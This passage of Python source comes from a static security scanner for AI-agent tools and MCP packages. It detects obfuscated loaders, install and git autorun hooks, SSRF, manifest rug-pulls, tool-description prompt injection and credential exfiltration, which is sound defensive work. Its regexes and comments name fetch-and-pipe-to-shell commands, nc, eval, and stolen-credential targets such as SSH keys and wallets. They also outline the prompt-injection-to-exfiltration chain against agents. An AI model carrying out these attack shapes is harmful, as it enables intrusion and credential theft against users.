                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    kind=kind,
                    capability=capability,
                    # Not downgraded (repo parity); graded as shipped when payload-shaped.
                    payload=(payload_mode and is_downgraded and kind == "defect"
                             and (emitted_name in _PAYLOAD_OBFUSCATION_NAMES
                                  or (emitted_name == "Obfuscated eval (Python)"
                                      and _OBFUSCATED_BUILTIN_CALL_RE.search(line)
                                      is not None))),
                ))
                break

    # Tool descriptions written in source (a FastMCP `@mcp.tool` docstring, a TS
    # `server.tool("x", "<description>", …)`): read with the metadata scan's tool-poisoning
    # shapes, on the description text only (src/scanner/tool_descriptions.py).
    if file_lang in ("python", "javascript", "typescript") and not is_metadata \
            and not metadata_text and not is_declaration:
        from src.scanner.tool_descriptions import tool_description_hits
        for hit in tool_description_hits(content, file_lang):
            if _is_allowlisted(file_path, hit.name, allowlist):
                continue
            sev = hit.severity
            if (file_downgraded or hit.line_number - 1 in test_lines) \
                    and sev in ("critical", "high"):
                sev = "medium"
            # The description reading replaces the line engine's on that line.
            findings = [f for f in findings if not (
                f.category == "prompt_injection" and f.line_number == hit.line_number)]
            findings.append(Finding(
                category="prompt_injection",
                name=hit.name,
                severity=sev,
                file_path=file_path,
                line_number=hit.line_number,
                snippet=hit.snippet,
                remediation=_why("text in an agent tool's description (read by the model "
                                 "that calls the tool)", "prompt_injection", "defect"),
            ))

    # A suppressed line that fell through (it matched a critical/high PATTERN) but
    # classified as a capability or a low/medium is what the suppression was for.
    # Only a critical/high DEFECT survives `ag-scan:ignore`.
    if suppressed_lines:
        findings = [
            f for f in findings
            if f.line_number not in suppressed_lines
            or (f.kind == "defect" and f.severity in ("critical", "high"))
        ]

    is_test_or_doc, is_downgraded = file_test_or_doc, file_downgraded
    if test_lines:
        for f in findings:
            if f.line_number - 1 in test_lines:
                f.test_code = True

    # Split fetch->exec across lines: a network read + an exec sink co-occurring in
    # one file is the classic rug-pull loader the per-line scan can't see. Fire only
    # when they're within ~40 lines of each other (keeps the composite finding tight).
    # Docstring lines (prose) don't count as either leg.
    # Precision PR 2: flow, not proximity: the exec sink must USE what was read (inline,
    # or through a name assigned from the read). `ThreadedStream.fetch()` beside
    # `exec(code, self.locals)` or `urlopen(target)` 30 lines above `eval(target, ns)`
    # is co-occurrence, not a loader.
    # The three flow rules below are payload shapes: in a downgraded artifact file
    # (payload_mode) they run too, graded as shipped code.
    flow_rules = not is_downgraded or payload_mode
    if flow_rules and _found(NET_READ_RE) and _found(EXEC_SINK_RE):
        hit = _cooccur_flow(lines, _string_state()[0], NET_READ_RE.search, EXEC_SINK_RE, 40)
        if hit is not None:
            findings.append(Finding(
                category="dynamic_remote_load",
                name="Remote fetch + dynamic exec in same file (possible rug-pull)",
                severity="high",
                file_path=file_path,
                line_number=hit + 1,
                snippet="network read + exec sink co-occur — remote payload may be swappable",
                payload=is_downgraded,
            ))

    # Untrusted input handed to a code-evaluating METHOD (precision PR 2): werkzeug's
    # debugger reads `cmd = request.args.get("cmd")`, passes it to
    # `self.execute_command(request, cmd, frame)`, which runs `frame.eval(command)`. A
    # flow, followed one call deep inside the file, not proximity.
    # (Only a line with an `.eval(` / `.exec(` method call can be the hit.)
    if (file_lang == "python" and untrusted and flow_rules
            and lf.may_match_a_line(_EVAL_METHOD_CALL_RE)):
        f_eval = _untrusted_to_eval_method(lines, untrusted, _string_state()[0])
        if f_eval is not None:
            findings.append(Finding(
                category="unsafe_exec",
                name="Untrusted input passed to an eval/exec method (Python)",
                severity="high",
                file_path=file_path,
                line_number=f_eval + 1,
                snippet=lines[f_eval].strip()[:120],
                remediation=_why("a request value reaches a method that evaluates code",
                                 "unsafe_exec", "defect"),
                payload=is_downgraded,
            ))

    # Split decode->exec across lines: `payload = base64.b64decode(...)` then
    # `exec(payload)` a few lines later is the obfuscated loader (OSV MAL- family); the
    # one-line form is the "Decoded payload fed to exec/eval" pattern above.
    if (flow_rules and _found(DECODE_SINK_RE) and _found(EXEC_SINK_RE)
            and not any(f.name == "Decoded payload fed to exec/eval" for f in findings)):
        hit = _cooccur_flow(lines, _string_state()[0], _is_decode_line, _PY_EVAL_CALL_RE, 10,
                            exclude_b=_DEF_EVAL_EXEC_RE)
        if hit is not None:
            findings.append(Finding(
                category="obfuscation",
                name="Decoded payload + dynamic exec in same file (obfuscated loader)",
                severity="high",
                file_path=file_path,
                line_number=hit + 1,
                snippet="base64/hex/zlib decode and exec/eval within 10 lines",
                payload=is_downgraded,
            ))

    # Evasion shapes from Pluto Security's clean-scan study (see src/scanner/evasion.py):
    # a dangerous name assembled from string pieces at a lookup, and an XOR'd decoded
    # payload run by exec/eval in another function. Both are payload-shaped.
    if file_lang in ("python", "javascript", "typescript") and not is_declaration:
        from src.scanner.evasion import assembled_name_hits, xor_decode_exec_hit
        for i, joined, ctx, sev in assembled_name_hits(lines, file_lang, _string_state()[0]):
            g_sev, g_payload = _graded("defect", sev, True)
            findings.append(Finding(
                category="obfuscation",
                name=("Module name assembled from string pieces" if ctx == "module"
                      else "Dangerous name assembled from string pieces"),
                severity=g_sev,
                file_path=file_path,
                line_number=i + 1,
                snippet=lines[i].strip()[:120],
                remediation=_why(f"'{joined}' is built from pieces so the name never "
                                 "appears in the source", "obfuscation", "defect"),
                payload=g_payload,
            ))
        if file_lang == "python" and not any(
                f.name.startswith("Decoded payload") for f in findings):
            hit = xor_decode_exec_hit(lines, _string_state()[0])
            if hit is not None:
                g_sev, g_payload = _graded("defect", "high", True)
                findings.append(Finding(
                    category="obfuscation",
                    name="XOR-decoded payload + exec/eval in same file (obfuscated loader)",
                    severity=g_sev,
                    file_path=file_path,
                    line_number=hit + 1,
                    snippet=lines[hit].strip()[:120],
                    remediation=_why("bytes are decoded and XOR'd with a key in a file "
                                     "that calls exec/eval", "obfuscation", "defect"),
                    payload=g_payload,
                ))

    # SSRF (structural): an MCP tool that builds an outbound request from a caller-supplied
    # URL with no destination validation (CVE-2026-14540 class). Whole-file, MEDIUM,
    # low-confidence — the sandbox SSRF probe is the high-confidence detector. Fire once per
    # file, only on an MCP-tool surface with a url-shaped input, a variable-built request,
    # and NO guard token anywhere in the file.
    if (_found(SSRF_TOOL_SURFACE_RE) and _found(SSRF_URL_INPUT_RE)
            and _found(SSRF_DYNAMIC_FETCH_RE)
            and not _found(SSRF_GUARD_RE)):
        m = SSRF_DYNAMIC_FETCH_RE.search(content)
        line_no = content[:m.start()].count("\n") + 1
        findings.append(Finding(
            category="ssrf",
            name="MCP tool fetches a caller-supplied URL without validation (possible SSRF)",
            severity="medium",
            file_path=file_path,
            line_number=line_no,
            snippet=lines[line_no - 1].strip()[:120] if line_no - 1 < len(lines) else "",
            remediation=(
                "A tool input names a URL/endpoint and the file issues an outbound request "
                "built from a variable with no check on where it resolves, so an agent can "
                "steer it at internal or cloud-metadata addresses. Resolve the host and "
                "reject private/link-local/metadata ranges, disable redirects, and allowlist "
                "the destinations the tool needs. AgentAvow's sandbox confirms this at runtime."
            ),
        ))

    # Manifest command/args rug-pull (#4, MCPoison) — structural, not per-line
    if is_metadata and Path(file_path).name.lower().endswith(".json"):
        findings.extend(_scan_manifest_exec(content, file_path))

    # Git-config autorun (GitSpawn class) — a shipped .git/config or .gitconfig that
    # executes a command on routine git operations. Path-gated inside the scanner.
    findings.extend(_scan_git_autorun(content, file_path))
    # Committed active git hooks (.git/hooks/<name>) — same autorun class. Path-gated.
    findings.extend(_scan_git_hooks(content, file_path))

    # Toxic-flow / lethal-trifecta composition (#9) — whole-file capability co-occurrence
    findings.extend(_composite_findings(content, file_path, lines, is_downgraded, allowlist,
                                        lf=lf))
    findings.extend(_credential_exfil_findings(
        content, file_path, lines, file_lang, allowlist,
        payload=payload_mode and file_downgraded, lf=lf))

    # Add remediation hints to all findings. A capability carries its description
    # (nothing to remediate — it's what the tool does), never the category hint.
    for f in findings:
        if f.remediation:
            continue
        if f.kind == "capability":
            from src.scanner.exec_classify import CAPABILITY_LABELS
            f.remediation = CAPABILITY_LABELS.get(
                f.capability, "Reported for visibility; not scored")
        else:
            f.remediation = _REMEDIATION_HINTS.get(f.category, "Review and address this finding")

    # Check positive signals per-line, skipping comments and examples
    # (same filtering as negative patterns to prevent comment-trick gaming)
    positive_plan = lf.plan(AUTH_POSITIVE_PATTERNS)
    positive_idxs = (range(len(lines)) if positive_plan.always_active
                     else sorted(positive_plan.table))
    for pidx in positive_idxs:
        line = lines[pidx]
        rules = positive_plan.table.get(pidx, positive_plan.default)
        stripped_pos = line.strip()
        if not stripped_pos:
            continue
        if stripped_pos.startswith(("#", "//", "*", "/*")):
            continue
        if "example" in stripped_pos.lower() or "placeholder" in stripped_pos.lower():
            continue
        for name, pattern in rules:
            if pattern.search(stripped_pos):
                positives.append(name)

    return findings, positives, suppressed_count


def _scan_dependencies(content: str, file_path: str) -> list[Finding]:
    """Scan dependency files for known vulnerable package versions.

    Parses requirements.txt, pyproject.toml, package.json, etc. and checks
    against a curated list of packages with known critical CVEs.
    """
    findings: list[Finding] = []
    filename = Path(file_path).name.lower()

    if filename not in {f.lower() for f in _DEP_FILES}:
        return findings

    for pkg_name, vuln_pattern, severity, description in _VULN_DEPS:
        # Search the entire file content for vulnerable version patterns
        for line_num, line in enumerate(content.split("\n"), 1):
            stripped = line.strip()
            # Skip comments
            if stripped.startswith(("#", "//", "*")):
                continue
            if vuln_pattern.search(stripped):
                findings.append(Finding(
                    category="dependency",
                    name=f"Vulnerable dependency: {pkg_name}",
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=description,
                ))
                break  # one finding per package per file

    # --- Install-script analysis (#5) — npm lifecycle hooks run on `npm install` ---
    if filename == "package.json":
        findings.extend(_scan_install_hooks(content, file_path))

    return findings


def _iter_command_specs(node):
    """Yield every {command, args} object nested anywhere in a parsed manifest."""
    if isinstance(node, dict):
        if isinstance(node.get("command"), str):
            args = node.get("args")
            args_str = " ".join(str(a) for a in args) if isinstance(args, list) else ""
            yield f"{node['command']} {args_str}".strip()
        for value in node.values():
            yield from _iter_command_specs(value)
    elif isinstance(node, list):
        for value in node:
            yield from _iter_command_specs(value)


def _scan_manifest_exec(content: str, file_path: str) -> list[Finding]:
    """#4 — inspect an MCP manifest's command/args for rug-pull exec (CVE-2025-54136).

    A mutable mcp.json/server.json whose command launches an inline interpreter-eval or
    pipes a remote fetch to a shell is the MCPoison vector: the client re-reads the file,
    so a swapped command runs on re-launch. Structural (parses JSON), not line-by-line.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    seen: set[tuple[str, str]] = set()
    for command_line in _iter_command_specs(data):
        for name, pattern, severity in MANIFEST_EXEC_PATTERNS:
            if pattern.search(command_line):
                if (name, command_line) in seen:
                    continue
                seen.add((name, command_line))
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=1,
                    snippet=command_line[:120],
                ))
                break  # one finding per command spec
    return findings


_NODE_EVAL_SEGMENT_RE = re.compile(
    r"""\bnode\s+(?:-e|--eval)\s+(?:"([^"]*)"|'([^']*)')""", re.IGNORECASE,
)


# The only inline snippets treated as inert: an exit code or a constant log line.
_INERT_NODE_SNIPPET_RE = re.compile(
    r"""^\s*(?:process\.exit\(\s*\d*\s*\)|console\.(?:log|warn|error)\(\s*(?:'[^'$`\\]*'|"""
    r"""\\?"[^"$`\\]*\\?"|\d+)?\s*\))\s*;?\s*$""",
)


# A snippet whose only effect is loading a local file of the package itself, e.g. core-js's
# ``try{require('./postinstall')}catch(e){}``. That is no more dangerous than the hook
# running ``node ./postinstall.js`` (already medium). The path must be a constant
# relative literal of plain path characters; the catch body may be empty or a constant
# log line. Anything else (another call, a concatenated path, a bare module name such as
# ``require('http')``) does not match and stays critical.
_CONST_LOG = r"""console\.(?:log|warn|error)\(\s*(?:'[^'$`\\]*'|\d+)?\s*\)"""
_LOCAL_PATH = r"""\.{1,2}/[A-Za-z0-9_./-]*"""
_LOCAL_REQUIRE = rf"""require\(\s*(?:'{_LOCAL_PATH}'|"{_LOCAL_PATH}")\s*\)"""
_INERT_LOCAL_REQUIRE_RE = re.compile(
    rf"""^\s*(?:{_LOCAL_REQUIRE}\s*;?|"""
    rf"""try\s*\{{\s*{_LOCAL_REQUIRE}\s*;?\s*\}}\s*catch\s*(?:\(\s*\w+\s*\))?\s*"""
    rf"""\{{\s*(?:{_CONST_LOG}\s*;?\s*)?\}})\s*;?\s*$""",
)

_REQUIRE_PATH_RE = re.compile(r"""require\(\s*(['"])(.*?)\1""")


def _is_inert_local_require(code: str) -> bool:
    m = _INERT_LOCAL_REQUIRE_RE.match(code)
    if not m:
        return False
    path = _REQUIRE_PATH_RE.search(code).group(2)
    normalized = posixpath.normpath(path)
    # Must resolve inside the package root (the hook's cwd): no `..` escape.
    return normalized != ".." and not normalized.startswith("../")


def _strip_inert_node_eval(cmd: str) -> str:
    """Remove ``node -e "<snippet>"`` segments whose snippet is a known no-op
    (``process.exit(0)`` as an ``||`` fallback, a constant ``console.log``) or only
    requires a local file inside the package (optionally in an empty try/catch) before
    the danger check. Anything else (other ``require(…)``, fetch, eval, shell expansion)
    stays."""
    def _inert(m: re.Match) -> str:
        code = m.group(1) if m.group(1) is not None else m.group(2)
        if _INERT_NODE_SNIPPET_RE.match(code) or _is_inert_local_require(code):
            return "node <inert-inline>"
        return m.group(0)
    return _NODE_EVAL_SEGMENT_RE.sub(_inert, cmd)


def _scan_install_hooks(content: str, file_path: str) -> list[Finding]:
    """#5 — flag npm pre/post/install lifecycle scripts (a top supply-chain vector).

    These run automatically on `npm install`. Presence alone is a medium signal; a hook
    that fetches/pipes-to-shell/evals is escalated to critical.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return findings
    for hook in NPM_INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if not isinstance(cmd, str) or not cmd.strip():
            continue
        if INSTALL_SCRIPT_DANGER_RE.search(_strip_inert_node_eval(cmd)):
            severity, label = "critical", "runs remote/shell/eval content"
        else:
            severity, label = "medium", "auto-runs on install"
        findings.append(Finding(
            category="install_hook",
            name=f"npm '{hook}' lifecycle script ({label})",
            severity=severity,
            file_path=file_path,
            line_number=1,
            snippet=f"{hook}: {cmd}"[:120],
            remediation=_REMEDIATION_HINTS["install_hook"],
        ))
    return findings


def _is_git_config_file(file_path: str) -> bool:
    """True if the path is a git config file that could carry autorun directives.

    Covers a committed/shipped `.gitconfig`, a nested `.git/config` (the GitSpawn vector —
    a repo that ships its own `.git/` so any git command in the clone auto-executes), and
    dotfile-template variants (`gitconfig`)."""
    p = Path(file_path)
    name = p.name.lower()
    if name in (".gitconfig", "gitconfig"):
        return True
    # a `config` file living inside a (committed) .git directory
    return name == "config" and any(part.lower() == ".git" for part in p.parts)


# Real git hook names. A committed `.git/hooks/<name>` (without the `.sample` suffix git
# ships) auto-executes on the matching git event — so a repo/package that ships its own
# `.git/hooks/pre-commit` turns a routine commit/checkout/merge into code execution.
_GIT_HOOK_NAMES = frozenset({
    "applypatch-msg", "pre-applypatch", "post-applypatch", "pre-commit",
    "pre-merge-commit", "prepare-commit-msg", "commit-msg", "post-commit", "pre-rebase",
    "post-checkout", "post-merge", "pre-push", "pre-receive", "update", "proc-receive",
    "post-receive", "post-update", "reference-transaction", "push-to-checkout",
    "pre-auto-gc", "post-rewrite", "sendemail-validate", "fsmonitor-watchman",
    "post-index-change",
})


def _is_git_hook_file(file_path: str) -> bool:
    """True for a committed `.git/hooks/<real-hook>` script (not a `.sample` template)."""
    p = Path(file_path)
    parts = [x.lower() for x in p.parts]
    if ".git" not in parts:
        return False
    gi = parts.index(".git")
    if gi + 1 >= len(parts) or parts[gi + 1] != "hooks":
        return False
    name = p.name
    return not name.endswith(".sample") and name.lower() in _GIT_HOOK_NAMES


def _scan_git_hooks(content: str, file_path: str) -> list[Finding]:
    """Flag a committed, active git hook — it runs on its git event with no opt-in. Its
    script body is separately scanned by the normal pattern passes; this adds the
    'this is a shipped autorun hook' finding. Path-gated."""
    if not _is_git_hook_file(file_path) or not (content or "").strip():
        return []
    hook = Path(file_path).name
    first = next((ln for ln in content.splitlines() if ln.strip()), "")
    return [Finding(
        category="git_autorun",
        name=(f"Git-config autorun: committed .git/hooks/{hook} "
              f"runs on git {hook.replace('-', ' ')}"),
        severity="high",
        file_path=file_path,
        line_number=1,
        snippet=first[:120],
        remediation=_REMEDIATION_HINTS["git_autorun"],
    )]


# git-config keys that cause a command to run during ordinary git operations. These
# are the "clone → any git op → RCE" (GitSpawn class) vectors. fsmonitor/hooksPath/
# sshCommand fire on routine commands (status/add/commit/fetch/push) with no opt-in →
# high; pager/editor need a specific command → medium; `!`-aliases need the alias to be
# invoked → medium.
_GIT_AUTORUN_CORE_HIGH = {"fsmonitor", "hookspath", "sshcommand"}
_GIT_AUTORUN_CORE_SHELL = {"pager", "editor"}  # only dangerous when set to a shell command
_GIT_SECTION_RE = re.compile(r'^\s*\[\s*([A-Za-z0-9.-]+)(?:\s+"[^"]*")?\s*\]')
_GIT_KV_RE = re.compile(r'^\s*([A-Za-z][A-Za-z0-9-]*)\s*=\s*(.*?)\s*$')
# For pager/editor: a value that runs a shell command (vs a plain program name like
# `vim`/`less`/`delta`): shell metacharacters, an explicit `sh -c`, or a fetch/interpreter.
_GIT_SHELL_DANGER_RE = re.compile(
    r"[;&|`]|\$\(|\b(?:sh|bash|zsh|ash)\s+-c\b|\b(?:curl|wget|nc|eval|python[0-9.]*|perl|node|ruby)\b")
# For `!`-aliases (which run a shell by definition and are overwhelmingly benign — `!git
# diff`, helper functions): only the download-and-execute / eval / pipe-to-shell pattern is
# a real red flag. Deliberately NARROW so ordinary function-style aliases don't false-fire.
_GIT_FETCH_EXEC_RE = re.compile(
    r"\|\s*(?:sh|bash|zsh|ash)\b"                    # pipe to a shell
    r"|\b(?:curl|wget|fetch)\b.*(?:\||-o\b|>|\bsh\b|\bbash\b)"  # download then run/save
    r"|\beval\b|\bbase64\s+-d\b",                    # eval / decode-and-run
    re.IGNORECASE)


def _scan_git_autorun(content: str, file_path: str) -> list[Finding]:
    """Flag git-config directives that execute a command on routine git operations.

    A repo that ships a `.git/config` or `.gitconfig` with `core.fsmonitor` (or
    `core.hooksPath` / `core.sshCommand` / a `!`-shell alias) set to a command turns a
    plain `git status`/`clone` into remote code execution (the GitSpawn class). Static,
    path-gated — only runs on git-config files."""
    findings: list[Finding] = []
    if not _is_git_config_file(file_path):
        return findings
    section = ""
    for i, raw in enumerate(content.splitlines()):
        m = _GIT_SECTION_RE.match(raw)
        if m:
            section = m.group(1).lower()
            continue
        kv = _GIT_KV_RE.match(raw)
        if not kv:
            continue
        key, value = kv.group(1).lower(), kv.group(2).strip().strip('"').strip("'")
        if not value:
            continue
        sev = label = None
        if section == "core" and key in _GIT_AUTORUN_CORE_HIGH:
            # fsmonitor=true is the built-in monitor (safe); a path/command is the attack.
            if key == "fsmonitor" and value.lower() in ("true", "false"):
                continue
            sev, label = "high", f"core.{kv.group(1)} runs a command on routine git operations"
        elif section == "core" and key in _GIT_AUTORUN_CORE_SHELL:
            # pager/editor are usually a plain program (vim/less) — only a shell command runs code.
            if _GIT_SHELL_DANGER_RE.search(value):
                sev, label = "high", f"core.{kv.group(1)} runs a shell command (on git {key})"
        elif section == "alias" and value.startswith("!") and _GIT_FETCH_EXEC_RE.search(value):
            # Not every `!`-alias — only one that downloads-and-runs / evals (the RCE shape).
            sev, label = "high", f"git alias '{kv.group(1)}' downloads and executes code"
        if sev:
            findings.append(Finding(
                category="git_autorun",
                name=f"Git-config autorun: {label}",
                severity=sev,
                file_path=file_path,
                line_number=i + 1,
                snippet=f"[{section}] {kv.group(1)} = {value}"[:120],
                remediation=_REMEDIATION_HINTS["git_autorun"],
            ))
    return findings


def _canonical_tool_digest(content: str, file_path: str) -> str | None:
    """#8 — canonical sha256 of an agent/tool definition file, for drift-pinning.

    Returns None for non-metadata files. JSON manifests (mcp.json/server.json/
    ai-plugin.json) are canonicalized (sorted keys, no whitespace) so reformatting
    is NOT drift — only a semantic change to the tool definition is. Markdown/text
    (SKILL.md, agents.md) is line-normalized (strip trailing ws, collapse blank ends).
    """
    name = Path(file_path).name.lower()
    if name not in AGENT_METADATA_FILES:
        return None
    if name.endswith(".json"):
        try:
            obj = json.loads(content)
            canon = json.dumps(
                obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False,
            )
        except (ValueError, TypeError):
            canon = "\n".join(ln.rstrip() for ln in content.splitlines())
    else:
        canon = "\n".join(ln.rstrip() for ln in content.splitlines()).strip("\n")
    return "sha256:" + hashlib.sha256(canon.encode("utf-8")).hexdigest()


def _compute_manifest_digest(tool_digests: dict[str, str]) -> str | None:
    """Combine per-file tool digests into one manifest digest for the attestation."""
    if not tool_digests:
        return None
    joined = "\n".join(f"{p}={tool_digests[p]}" for p in sorted(tool_digests))
    return "sha256:" + hashlib.sha256(joined.encode("utf-8")).hexdigest()


_RESPONSE_SEND_RE = re.compile(
    r"\b(?:res|resp|response|reply|ctx)\s*(?:\.\s*status\s*\([^)]*\))?\s*\.\s*send\s*\(")
# `X.status(NNN).send(<literal>)`: an HTTP error/status reply with a fixed message
# (notion-mcp-server's minified `_.status(400).send("Invalid or missing session ID")`).
# Keyed on the ARGUMENT, not on proving X is a response: a string or number literal
# carries no data, so even if X were a socket in disguise this line moves nothing.
_LITERAL_STATUS_SEND_RE = re.compile(
    r"""[\w$]+\s*\.\s*status\s*\(\s*[1-5]\d\d\s*\)\s*\.\s*send\s*\(\s*"""
    r"""(?:"[^"\\\n]*(?:\\.[^"\\\n]*)*"|'[^'\\\n]*(?:\\.[^'\\\n]*)*'|`[^`$\\\n]*`|\d+)"""
    # ...and the call ends the expression: its return value must not be used
    r"""\s*\)(?!\s*(?:[.(\[`]|\?\.))""")


_QUOTED_WEBHOOK_RE = re.compile(r"""(["'])webhooks?\1""", re.IGNORECASE)


def _near_read(reads: list[int], sends: list[int], near) -> int | None:
    """The first read line that has a send within the window (``near`` is the
    composite's window test)."""
    for r in reads:
        if near([r], sends) is not None:
            return r
    return None


def _composite_findings(
    content: str,
    file_path: str,
    lines: list[str],
    is_test_or_doc: bool,
    allowlist: object,
    *,
    lf: LineFilter | None = None,
) -> list[Finding]:
    """#9 — the lethal trifecta: private-data read + untrusted input + outbound send.

    Each capability is benign alone; together in one tool they form the prompt-injection
    → exfiltration chain (Willison's "lethal trifecta"; the Invariant GitHub-MCP exploit).
    We require ALL THREE legs present to keep precision high — a pure API wrapper that
    reads an env key and posts to one endpoint, with no untrusted-content ingestion,
    does NOT trigger. Emits at most one finding per file.
    """
    # ``lf`` (the caller's LineFilter over ``content``) only skips searches that cannot
    # match: a regex whose required literals are absent from the file / the line.
    if lf is None:
        lf = LineFilter(content)

    def _found(rx: re.Pattern[str]) -> bool:
        return lf.search(rx) is not None

    # Cheap pre-check on the whole blob before the per-line pass
    if not (
        _found(UNTRUSTED_INPUT_RE)
        and _found(OUTBOUND_SEND_RE)
        and (_found(SENSITIVE_READ_RE) or _found(FILE_READ_RE))
    ):
        return []

    def _hits(rx: re.Pattern[str]) -> list[int]:
        out = []
        cand = lf.lines(rx)
        for i in range(len(lines)) if cand is None else sorted(cand):
            ln = lines[i]
            stripped = ln.strip()
            if not stripped or stripped.startswith(("#", "//", "*", "/*")):
                continue
            if rx.search(ln):
                out.append(i + 1)
        return out

    # The bare word `webhook` counts as inbound input only as code (a `webhook` handler
    # or object), not as a quoted string (`"webhook" in self.alerting`, a config value).
    untrusted = [n for n in _hits(UNTRUSTED_INPUT_RE)
                 if UNTRUSTED_INPUT_RE.search(_QUOTED_WEBHOOK_RE.sub(" ", lines[n - 1]))]
    # An HTTP RESPONSE to the caller (`res.send(...)`, `reply.send(...)`) answers the
    # request; it is not an outbound send to a third party (precision PR 2).
    def _strip_literal(m: re.Match[str]) -> str:
        # ...and starts a statement, so its value is not assigned, returned or passed on
        i = m.start() - 1
        while i >= 0 and m.string[i].isspace():
            i -= 1
        before = m.string[max(0, i - 7):i + 1]  # bounded: no O(n^2) on minified lines
        if before and before[-1] not in ";{})" and not re.search(r"(?<![\w$])else$", before):
            return m.group(0)
        return " "

    def _strip_responses(n: int) -> str:
        return _RESPONSE_SEND_RE.sub(" ", _LITERAL_STATUS_SEND_RE.sub(_strip_literal,
                                                                      lines[n - 1]))

    outbound = [n for n in _hits(OUTBOUND_SEND_RE)
                if OUTBOUND_SEND_RE.search(_strip_responses(n))]
    sensitive = _hits(SENSITIVE_READ_RE)
    file_read = _hits(FILE_READ_RE)
    if not (untrusted and outbound and (sensitive or file_read)):
        return []

    # Precision: the read and the outbound send must be NEAR each other (a plausible
    # flow), not just co-present somewhere in a big file. A 2000-line HTTP-client lib
    # legitimately reads proxy env, parses responses, and makes requests in unrelated
    # places — that whole-file co-occurrence is not a real exfil chain (the requests
    # false-"high"). Require a read↔send pair within a small window.
    _prox = 45
    # Character distance too: in a bundled file with multi-KB lines, "within 45 lines"
    # is satisfied by everything (see _cooccur).
    offsets: list[int] = []
    pos = 0
    for ln in lines:
        offsets.append(pos)
        pos += len(ln) + 1

    def _near(reads: list[int], sends: list[int]) -> int | None:
        for r in reads:
            for s in sends:
                if (abs(r - s) <= _prox
                        and abs(offsets[r - 1] - offsets[s - 1]) <= _COOCCUR_MAX_CHARS):
                    return min(r, s)
        return None

    if _near(sensitive, outbound) is None and _near(file_read, outbound) is None:
        return []
    # Prefer the sensitive-leg finding only if a sensitive read is actually near a send.
    if sensitive and _near(sensitive, outbound) is None:
        sensitive = []

    # Report the read that sits next to the send (not the file's first read, which can
    # be thousands of lines from the pair that fired).
    if sensitive:
        name = "Lethal trifecta: private-data read + untrusted input + outbound network"
        severity = "high"
        line = _near_read(sensitive, outbound, _near) or sensitive[0]
    else:
        name = "Toxic flow: file read + untrusted input + outbound network"
        severity = "medium"
        line = _near_read(file_read, outbound, _near) or file_read[0]

    if _is_allowlisted(file_path, name, allowlist):
        return []
    if is_test_or_doc and severity in ("critical", "high"):
        severity = "medium"

    return [Finding(
        category="toxic_flow",
        name=name,
        severity=severity,
        file_path=file_path,
        line_number=line,
        snippet="capability composition — each part benign alone, dangerous together",
    )]


_CREDENTIAL_EXFIL_NAME = "Credential file read sent outbound"
_CREDENTIAL_KIND_LABELS = {
    "ssh": "an SSH private key", "aws": "AWS credentials", "gcloud": "gcloud credentials",
    "kube": "a kubeconfig", "netrc": "a .netrc / git credential store",
    "npmrc": "an .npmrc token", "pypirc": "a .pypirc password",
    "docker": "Docker registry credentials", "browser": "browser cookies / saved logins",
    "wallet": "a crypto wallet file", "env": "a .env file",
}


def _credential_exfil_findings(
    content: str, file_path: str, lines: list[str], file_lang: str | None,
    allowlist: set[tuple[str, str]], *, payload: bool, lf: LineFilter | None = None,
) -> list[Finding]:
    """A credential file's contents reaching an outbound send (``credential_flow``).

    Critical like the environment-dump rule, and never downgraded: in a test / doc
    directory of a published artifact it is a payload (``payload``) and keeps its
    severity."""
    from src.scanner.credential_flow import credential_exfil_hits

    if _is_allowlisted(file_path, _CREDENTIAL_EXFIL_NAME, allowlist):
        return []
    out = []
    for line_no, kind in credential_exfil_hits(content, file_lang, lf=lf):
        what = _CREDENTIAL_KIND_LABELS.get(kind, "a credential file")
        out.append(Finding(
            category="exfiltration",
            name=_CREDENTIAL_EXFIL_NAME,
            severity="critical",
            file_path=file_path,
            line_number=line_no,
            snippet=lines[line_no - 1].strip()[:120] if line_no - 1 < len(lines) else "",
            remediation=(
                f"This code reads {what} from the user's machine and sends the contents "
                "over the network. A tool has no reason to ship a local credential file "
                "anywhere; remove the read or the send."
            ),
            payload=payload,
        ))
    return out


_DEP_CATEGORIES = frozenset({"dependency", "install_hook"})
# Dependency/supply-chain vulns are a real but non-disqualifying signal *until*
# reachability (direct-prod vs transitive-dev) is known — so their penalty is
# capped and saturating, never a false-F. A known-malicious (OpenSSF MAL)
# package is the exception: malicious code in the dep tree is disqualifying.
_DEP_VULN_CAP = 18       # max points a repo can lose to CVE-class dep findings
_DEP_MAL_PENALTY = 70    # a MAL match forces the grade down hard
# Reachability weight: a CVE in a TRANSITIVE prod dep (buried behind another dep) is
# less reachable than one in a directly-declared dep, so it counts for less. Direct
# (and unknown-directness) findings keep full weight — this only softens transitives.
_TRANSITIVE_VULN_WEIGHT = 0.5


def _dependency_penalty(findings: list[Finding]) -> int:
    """Bounded, saturating penalty for dependency/supply-chain vulns.

    Diminishing returns per severity (the 1st vuln hurts most), capped at
    ``_DEP_VULN_CAP`` for CVE-class findings so a monorepo's transitive vulns
    can't false-flip a healthy package to F. A CVE in a directly-declared prod dep
    weighs full; a transitive one is sub-weighted (reachability). A known-malicious
    package short-circuits to ``_DEP_MAL_PENALTY`` regardless of depth."""
    deps = [f for f in findings if f.category in _DEP_CATEGORIES]
    if not deps:
        return 0
    if any(f.name.startswith("Known-malicious") for f in deps):
        return _DEP_MAL_PENALTY

    def _w(f: Finding) -> float:
        # Only OSV findings carry reachability; repo-level dep findings default direct.
        transitive = getattr(f, "reachability", "direct") == "transitive"
        return _TRANSITIVE_VULN_WEIGHT if transitive else 1.0

    crit = sum(_w(f) for f in deps if f.severity == "critical")
    high = sum(_w(f) for f in deps if f.severity == "high")
    med = sum(_w(f) for f in deps if f.severity == "medium")

    def _sat(n: float, cap: float) -> float:
        return cap * (1 - 0.5 ** n) if n > 0 else 0.0

    penalty = _sat(crit, 12) + _sat(high, 8) + _sat(med, 4)
    return int(min(penalty, _DEP_VULN_CAP))


def _certified_status(result: ScanResult) -> dict:
